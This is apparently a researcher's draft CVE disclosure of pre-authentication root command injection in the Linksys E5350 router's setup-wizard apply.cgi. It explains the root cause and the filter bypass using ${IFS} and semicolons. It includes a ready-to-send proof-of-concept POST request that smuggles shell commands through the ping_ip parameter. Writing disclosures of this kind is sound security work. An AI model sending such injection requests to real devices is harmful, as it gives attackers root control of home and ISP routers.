# CVE-TBD: Linksys E5350 /wizard/apply.cgi Pre-Authentication OS Command Injection in Factory/Setup State

## Affected Product

- Vendor: Linksys
- Product: E5350
- Firmware: v1.0.00.037 (latest and last release; the product is end-of-life)
- Component: `httpd` (CyberTAN-derived embedded web server) + `diag_pingbutton` / `diag_tracertbutton` service binaries

## Summary

A missing-authentication vulnerability was discovered in Linksys E5350
firmware v1.0.00.037. While the router is in factory/setup-wizard state
(`wizard_finish` not set — out-of-box or after a factory reset, before the
owner completes initial setup), the URL `/wizard/apply.cgi` is served
**without any authentication** and is dispatched by the *same* action table
as the authenticated `/apply.cgi`. This exposes the Diagnostics
`start_ping` / `start_traceroute` actions — whose `ping_ip` /
`traceroute_ip` parameters are executed unsanitized via `system()` — to
unauthenticated remote attackers, yielding **root command execution** on a
device that has not even completed initial setup.

## Vulnerability Type / CWE

- CWE-306: Missing Authentication for Critical Function
- chained with CWE-78: OS Command Injection (see companion filing
  03-diagnostics-command-injection for the injection primitive itself)

## Root Cause

- mime handler table (`httpd`, 0x4966c0) entry 18 maps `*wizard/apply.cgi*`
  to the **same** POST handler (0x430bc4) as `apply.cgi`, including the
  full gozila action table (86 entries) with `Diagnostics/start_ping`
  (handler 0x4636f8) and `Diagnostics/start_traceroute` (handler 0x463bb0).
- In wizard state, the httpd whitelist (index.asp, SysInfo.htm,
  close_wizard.cgi, session.cgi, sign.cgi, `wizard/*`, static assets) is
  served pre-auth; all non-whitelisted URLs are redirected (302) to
  index.asp.
- The only gate on the action dispatcher, `FUN_0042c8a0(submit_button)`, is
  an `[A-Za-z0-9._]` character whitelist — not an authorization check.
- The Diagnostics handlers store `ping_ip` / `traceroute_ip` to NVRAM
  verbatim; the service daemons (`diag_pingbutton` / `diag_tracertbutton`,
  triggered via `killall -HUP nvram_daemon` → `start_single_service()` in
  librc.so) build a shell command containing the raw value and call
  `system()`. Their blacklist blocks only space, `|` and `>` — it does not
  block `;`, `$`, `&` or `(`, so `${IFS}` supplies whitespace and
  multi-command injection works. A `getaddrinfo()` pre-check on the value
  is satisfied with an A record on an authoritative DNS server controlled
  by the attacker (uClibc does not reject shell metacharacters in
  hostnames).

## Proof of Concept (non-destructive)

Precondition: router in factory/wizard state. **No credentials, no session.**

```
POST /wizard/apply.cgi HTTP/1.1
Host: <ROUTER_IP>
Content-Type: application/x-www-form-urlencoded

submit_button=Diagnostics&submit_type=start_ping&change_action=gozila_cgi&gui_action=Apply&commit=1&ping_times=5&ping_size=64&ping_ip=y%3Bcd%24%7BIFS%7D..%3Bcd%24%7BIFS%7Dtmp%3Btouch%24%7BIFS%7De5350_pwned2%3By
```

(`ping_ip` decodes to `y;cd${IFS}..;cd${IFS}tmp;touch${IFS}e5350_pwned2;y`;
"y" resolves via attacker-controlled DNS.)

Observed on rehosted firmware (QEMU user-mode, wizard_finish=0, empty
credential store):

- `HTTP 200` with the 28,748-byte Diagnostics page — no authentication
  challenge.
- NVRAM store log: `SET ping_ip=y;cd${IFS}..;cd${IFS}tmp;touch${IFS}e5350_pwned2;y`
- Marker file `/tmp/e5350_pwned2` created by the injected shell commands.
  The identical execution chain via the authenticated path was additionally
  syscall-traced:
  `execve("/bin/sh",{"sh","-c","ping -c 5 -s 64 -o /tmp/ping.log y;cd${IFS}..;cd${IFS}tmp;touch${IFS}e5350_pwned2;y &"})`

Boundary controls:

- The identical POST to `/apply.cgi` (no `wizard/` prefix) in the same
  state returns `HTTP 302 -> /index.asp` (blocked, as designed).
- After setup completion (`wizard_finish=1`), `/wizard/apply.cgi` requires
  authentication.

## Impact

An unauthenticated attacker on the LAN (or the WAN side of ISP-deployed
units reachable during setup) gains arbitrary command execution as root on
a factory-fresh or freshly-reset router before the owner has set any
password — persistent backdoor installation, credential theft, botnet
enrollment. The setup window is exactly when replacement/ISP-deployed
units are most exposed, and every device passes through it.

## Non-duplication

The Diagnostics ping/traceroute command-injection defect family is known
in other CyberTAN-based Linksys models — CVE-2013-3307 (E1000/E1200/E3200,
diagnostic ping over port 52000), CVE-2013-10058 (WRT160Nv2 ping_size),
CVE-2024-48286 (E3000, filed as its own CVE in 2024). None of these cover
the E5350, and per-product filing is established practice for this code
lineage. The **pre-authentication reachability through the setup wizard**
documented here has no counterpart in any of those records. The only
existing E5350 CVE is CVE-2022-35572 (information disclosure, unrelated).

## Proposed CVSS 3.1

`AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` — **8.8 (High)**

## Discovery

- Date: 2026-10-11
- Method: static reverse engineering (Ghidra) + dynamic verification on
  rehosted firmware (QEMU user-mode) with runtime PoC evidence and boundary
  controls
- Researcher: Zimo-666

## Timeline

- 2026-10-11: Vulnerability discovered and verified
- TBD: Vendor notification
- TBD: CVE ID assignment
- TBD: Public disclosure
